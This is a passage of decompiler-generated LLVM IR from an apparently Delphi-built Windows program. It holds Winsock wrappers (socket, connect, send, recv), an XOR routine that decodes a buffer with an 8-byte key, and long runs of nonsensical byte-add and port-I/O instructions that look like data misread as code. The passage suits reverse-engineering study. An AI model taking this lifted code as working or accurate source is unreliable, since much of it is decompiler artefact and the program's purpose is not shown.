  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !224
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !224
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !225
  %2 = load i32, i32* @global_var_409664, align 4, !insn.addr !226
  %3 = add i32 %2, 1, !insn.addr !226
  store i32 %3, i32* @global_var_409664, align 4, !insn.addr !226
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !227
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !228
  ret i32 0, !insn.addr !229
}

define i32 @function_404639() local_unnamed_addr {
dec_label_pc_404639:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !230
  ret i32 %0, !insn.addr !230
}

define i32 @function_40463e() local_unnamed_addr {
dec_label_pc_40463e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !231
}

define i32 @function_404640(i32 %arg1) local_unnamed_addr {
dec_label_pc_404640:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !232
}

define i32 @function_404644() local_unnamed_addr {
dec_label_pc_404644:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409664, align 4, !insn.addr !233
  %2 = add i32 %1, -1, !insn.addr !233
  store i32 %2, i32* @global_var_409664, align 4, !insn.addr !233
  ret i32 %0, !insn.addr !234
}

define i32 @function_40464f() local_unnamed_addr {
dec_label_pc_40464f:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %3 = add i32 %1, -1, !insn.addr !235
  %4 = inttoptr i32 %1 to i32*, !insn.addr !235
  store i32 %3, i32* %4, align 4, !insn.addr !235
  %5 = bitcast i32* %eax to i8*
  %6 = load i8, i8* %5, align 4, !insn.addr !236
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !236
  %9 = add i8 %6, %8, !insn.addr !236
  %10 = inttoptr i32 %7 to i8*, !insn.addr !236
  store i8 %9, i8* %10, align 1, !insn.addr !236
  %11 = add i32 %2, 101, !insn.addr !237
  %12 = inttoptr i32 %11 to i8*, !insn.addr !237
  %13 = load i8, i8* %12, align 1, !insn.addr !237
  %14 = udiv i32 %2, 256, !insn.addr !237
  %15 = trunc i32 %14 to i8, !insn.addr !237
  %16 = add i8 %13, %15, !insn.addr !237
  store i8 %16, i8* %12, align 1, !insn.addr !237
  %17 = add i32 %1, 101, !insn.addr !238
  %18 = inttoptr i32 %17 to i32*, !insn.addr !238
  %19 = load i32, i32* %18, align 4, !insn.addr !238
  %20 = mul i32 %19, 1819042862, !insn.addr !238
  %21 = load i8, i8* %5, align 4, !insn.addr !239
  %22 = add i8 %21, %15, !insn.addr !239
  %23 = load i32, i32* %eax, align 4, !insn.addr !239
  %24 = inttoptr i32 %23 to i8*, !insn.addr !239
  store i8 %22, i8* %24, align 1, !insn.addr !239
  %25 = load i8, i8* %5, align 4, !insn.addr !240
  %26 = load i32, i32* %eax, align 4
  %27 = trunc i32 %26 to i8, !insn.addr !240
  %28 = add i8 %25, %27, !insn.addr !240
  %29 = inttoptr i32 %26 to i8*, !insn.addr !240
  store i8 %28, i8* %29, align 1, !insn.addr !240
  %30 = load i8, i8* %5, align 4, !insn.addr !241
  %31 = load i32, i32* %eax, align 4
  %32 = trunc i32 %31 to i8, !insn.addr !241
  %33 = add i8 %30, %32, !insn.addr !241
  %34 = inttoptr i32 %31 to i8*, !insn.addr !241
  store i8 %33, i8* %34, align 1, !insn.addr !241
  %35 = load i8, i8* %5, align 4, !insn.addr !242
  %36 = load i32, i32* %eax, align 4
  %37 = trunc i32 %36 to i8, !insn.addr !242
  %38 = add i8 %35, %37, !insn.addr !242
  %39 = inttoptr i32 %36 to i8*, !insn.addr !242
  store i8 %38, i8* %39, align 1, !insn.addr !242
  %40 = add i32 %0, -117, !insn.addr !243
  %41 = inttoptr i32 %40 to i8*, !insn.addr !243
  %42 = load i8, i8* %41, align 1, !insn.addr !243
  %43 = trunc i32 %2 to i8, !insn.addr !243
  %44 = add i8 %42, %43, !insn.addr !243
  store i8 %44, i8* %41, align 1, !insn.addr !243
  %45 = trunc i32 %2 to i16, !insn.addr !244
  %46 = call i8 @__asm_in(i16 %45), !insn.addr !244
  %47 = add i32 %20, -8, !insn.addr !245
  %48 = inttoptr i32 %47 to i32*, !insn.addr !245
  store i32 4212417, i32* %48, align 4, !insn.addr !245
  %49 = call i32 @__readfsdword(i32 0), !insn.addr !246
  %50 = add i32 %20, -12, !insn.addr !246
  %51 = inttoptr i32 %50 to i32*, !insn.addr !246
  store i32 %49, i32* %51, align 4, !insn.addr !246
  call void @__writefsdword(i32 0, i32 %50), !insn.addr !247
  %52 = load i32, i32* @global_var_409678, align 4, !insn.addr !248
  %53 = add i32 %52, 1, !insn.addr !248
  %54 = icmp eq i32 %53, 0, !insn.addr !248
  store i32 %53, i32* @global_var_409678, align 4, !insn.addr !248
  %55 = icmp eq i1 %54, false, !insn.addr !249
  br i1 %55, label %dec_label_pc_4046b3, label %dec_label_pc_404681, !insn.addr !249

dec_label_pc_404681:                              ; preds = %dec_label_pc_40464f
  %56 = call i32 @"@LStrClr"(), !insn.addr !250
  %57 = call i32 @"@LStrClr"(), !insn.addr !251
  %58 = call i32 @"@LStrClr"(), !insn.addr !252
  %59 = call i32 @"@LStrClr"(), !insn.addr !253
  %60 = call i32 @"@LStrClr"(), !insn.addr !254
  br label %dec_label_pc_4046b3, !insn.addr !254

dec_label_pc_4046b3:                              ; preds = %dec_label_pc_404681, %dec_label_pc_40464f
  %61 = add i32 %20, -4, !insn.addr !255
  %62 = inttoptr i32 %61 to i32*, !insn.addr !255
  %63 = load i32, i32* %51, align 4, !insn.addr !256
  call void @__writefsdword(i32 0, i32 %63), !insn.addr !257
  store i32 4212424, i32* %62, align 4, !insn.addr !258
  ret i32 0, !insn.addr !259
}

define i32 @function_4046c1() local_unnamed_addr {
dec_label_pc_4046c1:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !260
  ret i32 %0, !insn.addr !260
}

define i32 @function_4046c6() local_unnamed_addr {
dec_label_pc_4046c6:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !261
}

define i32 @function_4046c8(i32 %arg1) local_unnamed_addr {
dec_label_pc_4046c8:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !262
}

define i32 @function_4046cc() local_unnamed_addr {
dec_label_pc_4046cc:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409678, align 4, !insn.addr !263
  %2 = add i32 %1, -1, !insn.addr !263
  store i32 %2, i32* @global_var_409678, align 4, !insn.addr !263
  ret i32 %0, !insn.addr !264
}

define i32 @function_4046d4() local_unnamed_addr {
dec_label_pc_4046d4:
  %eax.1.reg2mem = alloca i32, !insn.addr !265
  %esi.0.reg2mem = alloca i32, !insn.addr !265
  %ebx.0.reg2mem = alloca i32, !insn.addr !265
  %eax.0.reg2mem = alloca i32, !insn.addr !265
  %0 = call i32 @function_403720(), !insn.addr !266
  %1 = call i32 @function_4034c8(), !insn.addr !267
  %2 = icmp slt i32 %1, 1
  store i32 %1, i32* %eax.0.reg2mem, !insn.addr !268
  store i32 0, i32* %ebx.0.reg2mem, !insn.addr !268
  store i32 %0, i32* %esi.0.reg2mem, !insn.addr !268
  store i32 %1, i32* %eax.1.reg2mem, !insn.addr !268
  br i1 %2, label %dec_label_pc_404709, label %dec_label_pc_4046ef, !insn.addr !268

dec_label_pc_4046ef:                              ; preds = %dec_label_pc_4046d4, %dec_label_pc_4046ef
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %3 = add i32 %ebx.0.reload, ptrtoint (i8** @global_var_4080d0 to i32), !insn.addr !269
  %4 = inttoptr i32 %3 to i8*, !insn.addr !269
  %5 = load i8, i8* %4, align 1, !insn.addr !269
  %6 = inttoptr i32 %esi.0.reload to i8*, !insn.addr !270
  %7 = load i8, i8* %6, align 1, !insn.addr !270
  %8 = xor i8 %7, %5, !insn.addr !270
  store i8 %8, i8* %6, align 1, !insn.addr !270
  %9 = add i32 %esi.0.reload, 1, !insn.addr !271
  %10 = add i32 %ebx.0.reload, 1, !insn.addr !272
  %11 = and i32 %10, -2147483641, !insn.addr !273
  %12 = icmp slt i32 %11, 0, !insn.addr !273
  %13 = icmp eq i1 %12, false, !insn.addr !274
  %14 = or i32 %ebx.0.reload, -8
  %15 = add nsw i32 %14, 1
  %ebx.1 = select i1 %13, i32 %11, i32 %15
  %16 = add i32 %eax.0.reload, -1, !insn.addr !275
  %17 = icmp eq i32 %16, 0, !insn.addr !275
  %18 = icmp eq i1 %17, false, !insn.addr !276
  store i32 %16, i32* %eax.0.reg2mem, !insn.addr !276
  store i32 %ebx.1, i32* %ebx.0.reg2mem, !insn.addr !276
  store i32 %9, i32* %esi.0.reg2mem, !insn.addr !276
  store i32 %16, i32* %eax.1.reg2mem, !insn.addr !276
  br i1 %18, label %dec_label_pc_4046ef, label %dec_label_pc_404709, !insn.addr !276

dec_label_pc_404709:                              ; preds = %dec_label_pc_4046ef, %dec_label_pc_4046d4
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  ret i32 %eax.1.reload, !insn.addr !277
}

define i32 @function_404710() local_unnamed_addr {
dec_label_pc_404710:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !278
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !278
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !278
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !279
  %2 = load i32, i32* @global_var_40967c, align 4, !insn.addr !280
  %3 = add i32 %2, 1, !insn.addr !280
  store i32 %3, i32* @global_var_40967c, align 4, !insn.addr !280
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !281
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !282
  ret i32 0, !insn.addr !283
}

define i32 @function_404735() local_unnamed_addr {
dec_label_pc_404735:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !284
  ret i32 %0, !insn.addr !284
}

define i32 @function_40473a() local_unnamed_addr {
dec_label_pc_40473a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !285
}

define i32 @function_40473c(i32 %arg1) local_unnamed_addr {
dec_label_pc_40473c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !286
}

define i32 @function_404740() local_unnamed_addr {
dec_label_pc_404740:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_40967c, align 4, !insn.addr !287
  %2 = add i32 %1, -1, !insn.addr !287
  store i32 %2, i32* @global_var_40967c, align 4, !insn.addr !287
  ret i32 %0, !insn.addr !288
}

define i32 @function_404748() local_unnamed_addr {
dec_label_pc_404748:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !289
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !289
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !289
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !290
  %2 = load i32, i32* @global_var_409680, align 4, !insn.addr !291
  %3 = add i32 %2, 1, !insn.addr !291
  store i32 %3, i32* @global_var_409680, align 4, !insn.addr !291
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !292
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !293
  ret i32 0, !insn.addr !294
}

define i32 @function_40476d() local_unnamed_addr {
dec_label_pc_40476d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !295
  ret i32 %0, !insn.addr !295
}

define i32 @function_404772() local_unnamed_addr {
dec_label_pc_404772:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !296
}

define i32 @function_404774(i32 %arg1) local_unnamed_addr {
dec_label_pc_404774:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !297
}

define i32 @function_404778() local_unnamed_addr {
dec_label_pc_404778:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409680, align 4, !insn.addr !298
  %2 = add i32 %1, -1, !insn.addr !298
  store i32 %2, i32* @global_var_409680, align 4, !insn.addr !298
  ret i32 %0, !insn.addr !299
}

define i32 @function_404780(i32 %s) local_unnamed_addr {
dec_label_pc_404780:
  %0 = call i32 @closesocket(i32 %s), !insn.addr !300
  ret i32 %0, !insn.addr !300
}

define i32 @function_404788(i32 %s, %sockaddr* %name, i32 %namelen) local_unnamed_addr {
dec_label_pc_404788:
  %0 = call i32 @connect(i32 %s, %sockaddr* %name, i32 %namelen), !insn.addr !301
  ret i32 %0, !insn.addr !301
}

define i16 @function_404790(i16 %hostshort) local_unnamed_addr {
dec_label_pc_404790:
  %0 = call i16 @htons(i16 %hostshort), !insn.addr !302
  ret i16 %0, !insn.addr !302
}

define i8* @function_404798(%in_addr %in) local_unnamed_addr {
dec_label_pc_404798:
  %0 = call i8* @inet_ntoa(%in_addr %in), !insn.addr !303
  ret i8* %0, !insn.addr !303
}

define i32 @function_4047a0(i32 %s, i8* %buf, i32 %len, i32 %flags) local_unnamed_addr {
dec_label_pc_4047a0:
  %0 = call i32 @recv(i32 %s, i8* %buf, i32 %len, i32 %flags), !insn.addr !304
  ret i32 %0, !insn.addr !304
}

define i32 @function_4047a8(i32 %s, i8* %buf, i32 %len, i32 %flags) local_unnamed_addr {
dec_label_pc_4047a8:
  %0 = call i32 @send(i32 %s, i8* %buf, i32 %len, i32 %flags), !insn.addr !305
  ret i32 %0, !insn.addr !305
}

define i32 @function_4047b0(i32 %af, i32 %type, i32 %protocol) local_unnamed_addr {
dec_label_pc_4047b0:
  %0 = call i32 @socket(i32 %af, i32 %type, i32 %protocol), !insn.addr !306
  ret i32 %0, !insn.addr !306
}

define %hostent* @function_4047b8(i8* %name) local_unnamed_addr {
dec_label_pc_4047b8:
  %0 = call %hostent* @gethostbyname(i8* %name), !insn.addr !307
  ret %hostent* %0, !insn.addr !307
}

define i32 @function_4047c0(i8* %name, i32 %namelen) local_unnamed_addr {
dec_label_pc_4047c0:
  %0 = call i32 @gethostname(i8* %name, i32 %namelen), !insn.addr !308
  ret i32 %0, !insn.addr !308
}

define i32 @function_4047c8(i16 %wVersionRequested, %WSAData* %lpWSAData) local_unnamed_addr {
dec_label_pc_4047c8:
  %0 = call i32 @WSAStartup(i16 %wVersionRequested, %WSAData* %lpWSAData), !insn.addr !309
  ret i32 %0, !insn.addr !309
}

define i32 @function_4047d0() local_unnamed_addr {
dec_label_pc_4047d0:
  %0 = call i32 @WSACleanup(), !insn.addr !310
  ret i32 %0, !insn.addr !310
}

define i32 @function_4047d8() local_unnamed_addr {
dec_label_pc_4047d8:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !311
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !311
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !311
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !312
  %2 = load i32, i32* @global_var_409684, align 4, !insn.addr !313
  %3 = add i32 %2, 1, !insn.addr !313
  store i32 %3, i32* @global_var_409684, align 4, !insn.addr !313
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !314
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !315
  ret i32 0, !insn.addr !316
}

define i32 @function_4047fd() local_unnamed_addr {
dec_label_pc_4047fd:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !317
  ret i32 %0, !insn.addr !317
}

define i32 @function_404802() local_unnamed_addr {
dec_label_pc_404802:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !318
}

define i32 @function_404804(i32 %arg1) local_unnamed_addr {
dec_label_pc_404804:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !319
}

define i32 @function_404808() local_unnamed_addr {
dec_label_pc_404808:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409684, align 4, !insn.addr !320
  %2 = add i32 %1, -1, !insn.addr !320
  store i32 %2, i32* @global_var_409684, align 4, !insn.addr !320
  ret i32 %0, !insn.addr !321
}

define i32 @function_404810(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_404810:
  %0 = call i32 @__decompiler_undefined_function_0()
  %ebx = alloca i32, align 4
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %4 = call i1 @__decompiler_undefined_function_1()
  %stack_var_-16 = alloca i32, align 4
  %5 = add i32 %0, 117, !insn.addr !322
  %6 = inttoptr i32 %5 to i32*, !insn.addr !322
  %7 = load i32, i32* %6, align 4, !insn.addr !322
  br i1 %4, label %dec_label_pc_404891, label %dec_label_pc_40481b, !insn.addr !323

dec_label_pc_40481b:                              ; preds = %dec_label_pc_404810
  %8 = mul i32 %7, 1616934626, !insn.addr !324
  %9 = add i32 %8, %3, !insn.addr !324
  %10 = inttoptr i32 %9 to i64*, !insn.addr !324
  %11 = load i64, i64* %10, align 4, !insn.addr !324
  %12 = call i32 @__asm_bound(i64 %11), !insn.addr !324
  %13 = bitcast i32* %eax to i8*
  %14 = load i8, i8* %13, align 4, !insn.addr !325
  %15 = load i32, i32* %eax, align 4
  %16 = trunc i32 %15 to i8, !insn.addr !325
  %17 = add i8 %14, %16, !insn.addr !325
  %18 = inttoptr i32 %15 to i8*, !insn.addr !325
  store i8 %17, i8* %18, align 1, !insn.addr !325
  %19 = load i8, i8* %13, align 4, !insn.addr !326
  %20 = load i32, i32* %eax, align 4
  %21 = trunc i32 %20 to i8, !insn.addr !326
  %22 = add i8 %19, %21, !insn.addr !326
  %23 = inttoptr i32 %20 to i8*, !insn.addr !326
  store i8 %22, i8* %23, align 1, !insn.addr !326
  %24 = load i8, i8* %13, align 4, !insn.addr !327
  %25 = load i32, i32* %eax, align 4
  %26 = trunc i32 %25 to i8, !insn.addr !327
  %27 = add i8 %24, %26, !insn.addr !327
  %28 = inttoptr i32 %25 to i8*, !insn.addr !327
  store i8 %27, i8* %28, align 1, !insn.addr !327
  %29 = load i8, i8* %13, align 4, !insn.addr !328
  %30 = load i32, i32* %eax, align 4
  %31 = trunc i32 %30 to i8, !insn.addr !328
  %32 = add i8 %29, %31, !insn.addr !328
  %33 = inttoptr i32 %30 to i8*, !insn.addr !328
  store i8 %32, i8* %33, align 1, !insn.addr !328
  %34 = load i8, i8* %13, align 4, !insn.addr !329
  %35 = load i32, i32* %eax, align 4
  %36 = trunc i32 %35 to i8, !insn.addr !329
  %37 = add i8 %34, %36, !insn.addr !329
  %38 = inttoptr i32 %35 to i8*, !insn.addr !329
  store i8 %37, i8* %38, align 1, !insn.addr !329
  %39 = load i8, i8* %13, align 4, !insn.addr !330
  %40 = load i32, i32* %eax, align 4
  %41 = trunc i32 %40 to i8, !insn.addr !330
  %42 = add i8 %39, %41, !insn.addr !330
  %43 = inttoptr i32 %40 to i8*, !insn.addr !330
  store i8 %42, i8* %43, align 1, !insn.addr !330
  %44 = load i8, i8* %13, align 4, !insn.addr !331
  %45 = load i32, i32* %eax, align 4
  %46 = trunc i32 %45 to i8, !insn.addr !331
  %47 = add i8 %44, %46, !insn.addr !331
  %48 = inttoptr i32 %45 to i8*, !insn.addr !331
  store i8 %47, i8* %48, align 1, !insn.addr !331
  %49 = load i8, i8* %13, align 4, !insn.addr !332
  %50 = load i32, i32* %eax, align 4
  %51 = trunc i32 %50 to i8, !insn.addr !332
  %52 = add i8 %49, %51, !insn.addr !332
  %53 = inttoptr i32 %50 to i8*, !insn.addr !332
  store i8 %52, i8* %53, align 1, !insn.addr !332
  %54 = load i8, i8* %13, align 4, !insn.addr !333
  %55 = load i32, i32* %eax, align 4
  %56 = trunc i32 %55 to i8, !insn.addr !333
  %57 = add i8 %54, %56, !insn.addr !333
  %58 = inttoptr i32 %55 to i8*, !insn.addr !333
  store i8 %57, i8* %58, align 1, !insn.addr !333
  %59 = load i8, i8* %13, align 4, !insn.addr !334
  %60 = load i32, i32* %eax, align 4
  %61 = trunc i32 %60 to i8, !insn.addr !334
  %62 = add i8 %59, %61, !insn.addr !334
  %63 = inttoptr i32 %60 to i8*, !insn.addr !334
  store i8 %62, i8* %63, align 1, !insn.addr !334
  %64 = load i8, i8* %13, align 4, !insn.addr !335
  %65 = load i32, i32* %eax, align 4
  %66 = trunc i32 %65 to i8, !insn.addr !335
  %67 = add i8 %64, %66, !insn.addr !335
  %68 = inttoptr i32 %65 to i8*, !insn.addr !335
  store i8 %67, i8* %68, align 1, !insn.addr !335
  %69 = load i8, i8* %13, align 4, !insn.addr !336
  %70 = load i32, i32* %eax, align 4
  %71 = trunc i32 %70 to i8, !insn.addr !336
  %72 = add i8 %69, %71, !insn.addr !336
  %73 = inttoptr i32 %70 to i8*, !insn.addr !336
  store i8 %72, i8* %73, align 1, !insn.addr !336
  %74 = load i8, i8* %13, align 4, !insn.addr !337
  %75 = load i32, i32* %eax, align 4
  %76 = trunc i32 %75 to i8, !insn.addr !337
  %77 = add i8 %74, %76, !insn.addr !337
  %78 = inttoptr i32 %75 to i8*, !insn.addr !337
  store i8 %77, i8* %78, align 1, !insn.addr !337
  %79 = load i8, i8* %13, align 4, !insn.addr !338
  %80 = load i32, i32* %eax, align 4
  %81 = trunc i32 %80 to i8, !insn.addr !338
  %82 = add i8 %79, %81, !insn.addr !338
  %83 = inttoptr i32 %80 to i8*, !insn.addr !338
  store i8 %82, i8* %83, align 1, !insn.addr !338
  %84 = load i8, i8* %13, align 4, !insn.addr !339
  %85 = load i32, i32* %eax, align 4
  %86 = trunc i32 %85 to i8, !insn.addr !339
  %87 = add i8 %84, %86, !insn.addr !339
  %88 = inttoptr i32 %85 to i8*, !insn.addr !339
  store i8 %87, i8* %88, align 1, !insn.addr !339
  %89 = load i8, i8* %13, align 4, !insn.addr !340
  %90 = load i32, i32* %eax, align 4
  %91 = trunc i32 %90 to i8, !insn.addr !340
  %92 = add i8 %89, %91, !insn.addr !340
  %93 = inttoptr i32 %90 to i8*, !insn.addr !340
  store i8 %92, i8* %93, align 1, !insn.addr !340
  %94 = load i8, i8* %13, align 4, !insn.addr !341
  %95 = load i32, i32* %eax, align 4
  %96 = trunc i32 %95 to i8, !insn.addr !341
  %97 = add i8 %94, %96, !insn.addr !341
  %98 = inttoptr i32 %95 to i8*, !insn.addr !341
  store i8 %97, i8* %98, align 1, !insn.addr !341
  %99 = load i8, i8* %13, align 4, !insn.addr !342
  %100 = load i32, i32* %eax, align 4
  %101 = trunc i32 %100 to i8, !insn.addr !342
  %102 = add i8 %99, %101, !insn.addr !342
  %103 = inttoptr i32 %100 to i8*, !insn.addr !342
  store i8 %102, i8* %103, align 1, !insn.addr !342
  %104 = load i8, i8* %13, align 4, !insn.addr !343
  %105 = load i32, i32* %eax, align 4
  %106 = trunc i32 %105 to i8, !insn.addr !343
  %107 = add i8 %104, %106, !insn.addr !343
  %108 = inttoptr i32 %105 to i8*, !insn.addr !343
  store i8 %107, i8* %108, align 1, !insn.addr !343
  %109 = load i8, i8* %13, align 4, !insn.addr !344
  %110 = load i32, i32* %eax, align 4
  %111 = trunc i32 %110 to i8, !insn.addr !344
  %112 = add i8 %109, %111, !insn.addr !344
  %113 = call i8 @llvm.ctpop.i8(i8 %112), !range !345, !insn.addr !344
  %114 = and i8 %113, 1, !insn.addr !344
  %115 = icmp eq i8 %114, 0, !insn.addr !344
  %116 = inttoptr i32 %110 to i8*, !insn.addr !344
  store i8 %112, i8* %116, align 1, !insn.addr !344
  %117 = icmp eq i1 %115, false, !insn.addr !346
  br i1 %117, label %dec_label_pc_4048cf, label %dec_label_pc_404856, !insn.addr !346

dec_label_pc_404856:                              ; preds = %dec_label_pc_40481b
  %118 = trunc i32 %2 to i16, !insn.addr !347
  %119 = inttoptr i32 %12 to i32*, !insn.addr !347
  %120 = load i32, i32* %119, align 4, !insn.addr !347
  call void @__asm_outsd(i16 %118, i32 %120), !insn.addr !347
  %121 = load i32, i32* %eax, align 4, !insn.addr !347
  ret i32 %121, !insn.addr !347

dec_label_pc_404891:                              ; preds = %dec_label_pc_404810
  %122 = mul i32 %7, 808467313, !insn.addr !322
  %123 = bitcast i32* %eax to i8*
  %124 = load i8, i8* %123, align 4, !insn.addr !348
  %125 = load i32, i32* %eax, align 4
  %126 = trunc i32 %125 to i8, !insn.addr !348
  %127 = add i8 %124, %126, !insn.addr !348
  %128 = inttoptr i32 %125 to i8*, !insn.addr !348
  store i8 %127, i8* %128, align 1, !insn.addr !348
  %129 = load i8, i8* %123, align 4, !insn.addr !349
  %130 = load i32, i32* %eax, align 4
  %131 = trunc i32 %130 to i8, !insn.addr !349
  %132 = add i8 %129, %131, !insn.addr !349
  %133 = inttoptr i32 %130 to i8*, !insn.addr !349
  store i8 %132, i8* %133, align 1, !insn.addr !349
  %134 = load i8, i8* %123, align 4, !insn.addr !350
  %135 = load i32, i32* %eax, align 4
  %136 = trunc i32 %135 to i8, !insn.addr !350
  %137 = add i8 %134, %136, !insn.addr !350
  %138 = inttoptr i32 %135 to i8*, !insn.addr !350
  store i8 %137, i8* %138, align 1, !insn.addr !350
  %139 = load i32, i32* %ebx, align 4
  %140 = add i32 %139, 121, !insn.addr !351
  %141 = inttoptr i32 %140 to i8*, !insn.addr !351
  %142 = load i8, i8* %141, align 1, !insn.addr !351
  %143 = udiv i32 %139, 256, !insn.addr !351
  %144 = trunc i32 %143 to i8, !insn.addr !351
  %145 = add i8 %142, %144, !insn.addr !351
  store i8 %145, i8* %141, align 1, !insn.addr !351
  %146 = trunc i32 %2 to i16, !insn.addr !352
  %147 = inttoptr i32 %122 to i32*, !insn.addr !352
  %148 = load i32, i32* %147, align 4, !insn.addr !352
  call void @__asm_outsd(i16 %146, i32 %148), !insn.addr !352
  %149 = load i32, i32* %eax, align 4
  %150 = xor i32 %149, 52, !insn.addr !353
  %151 = call i32 @__readfsdword(i32 %122), !insn.addr !354
  call void @__asm_outsd(i16 %146, i32 %151), !insn.addr !354
  %152 = inttoptr i32 %150 to i8*, !insn.addr !355
  %153 = load i8, i8* %152, align 1, !insn.addr !355
  %154 = trunc i32 %150 to i8, !insn.addr !355
  %factor = mul i8 %154, 18
  %155 = add i8 %factor, %153, !insn.addr !356
  store i8 %155, i8* %152, align 1, !insn.addr !356
  ret i32 %150, !insn.addr !356

dec_label_pc_4048cf:                              ; preds = %dec_label_pc_40481b
  %156 = sub i32 %0, %1, !insn.addr !357
  %157 = load i8, i8* %13, align 4, !insn.addr !358
  %158 = load i32, i32* %eax, align 4
  %159 = trunc i32 %158 to i8, !insn.addr !358
  %160 = add i8 %157, %159, !insn.addr !358
  %161 = inttoptr i32 %158 to i8*, !insn.addr !358
  store i8 %160, i8* %161, align 1, !insn.addr !358
  %162 = load i8, i8* %13, align 4, !insn.addr !359
  %163 = load i32, i32* %eax, align 4
  %164 = trunc i32 %163 to i8, !insn.addr !359
  %165 = add i8 %162, %164, !insn.addr !359
  %166 = inttoptr i32 %163 to i8*, !insn.addr !359
  store i8 %165, i8* %166, align 1, !insn.addr !359
  %167 = load i8, i8* %13, align 4, !insn.addr !360
  %168 = load i32, i32* %eax, align 4
  %169 = trunc i32 %168 to i8, !insn.addr !360
  %170 = add i8 %167, %169, !insn.addr !360
  %171 = inttoptr i32 %168 to i8*, !insn.addr !360
  store i8 %170, i8* %171, align 1, !insn.addr !360
  %172 = load i8, i8* %13, align 4, !insn.addr !361
  %173 = load i32, i32* %eax, align 4
  %174 = trunc i32 %173 to i8, !insn.addr !361
  %175 = add i8 %172, %174, !insn.addr !361
  %176 = inttoptr i32 %173 to i8*, !insn.addr !361
  store i8 %175, i8* %176, align 1, !insn.addr !361
  %177 = load i8, i8* %13, align 4, !insn.addr !362
  %178 = load i32, i32* %eax, align 4
  %179 = trunc i32 %178 to i8, !insn.addr !362
  %180 = add i8 %177, %179, !insn.addr !362
  %181 = inttoptr i32 %178 to i8*, !insn.addr !362
  store i8 %180, i8* %181, align 1, !insn.addr !362
  %182 = load i8, i8* %13, align 4, !insn.addr !363
  %183 = load i32, i32* %eax, align 4
  %184 = trunc i32 %183 to i8, !insn.addr !363
  %185 = add i8 %182, %184, !insn.addr !363
  %186 = inttoptr i32 %183 to i8*, !insn.addr !363
  store i8 %185, i8* %186, align 1, !insn.addr !363
  %187 = bitcast i32* %ebx to i8*
  %188 = load i8, i8* %187, align 4, !insn.addr !364
  %189 = udiv i32 %2, 256, !insn.addr !364
  %190 = trunc i32 %189 to i8, !insn.addr !364
  %191 = add i8 %188, %190, !insn.addr !364
  %192 = load i32, i32* %ebx, align 4, !insn.addr !364
  %193 = inttoptr i32 %192 to i8*, !insn.addr !364
  store i8 %191, i8* %193, align 1, !insn.addr !364
  %194 = load i8, i8* %13, align 4, !insn.addr !365
  %195 = load i32, i32* %eax, align 4
  %196 = trunc i32 %195 to i8, !insn.addr !365
  %197 = add i8 %194, %196, !insn.addr !365
  %198 = inttoptr i32 %195 to i8*, !insn.addr !365
  store i8 %197, i8* %198, align 1, !insn.addr !365
  %199 = load i8, i8* %13, align 4, !insn.addr !366
  %200 = load i32, i32* %eax, align 4
  %201 = trunc i32 %200 to i8, !insn.addr !366
  %202 = add i8 %199, %201, !insn.addr !366
  %203 = inttoptr i32 %200 to i8*, !insn.addr !366
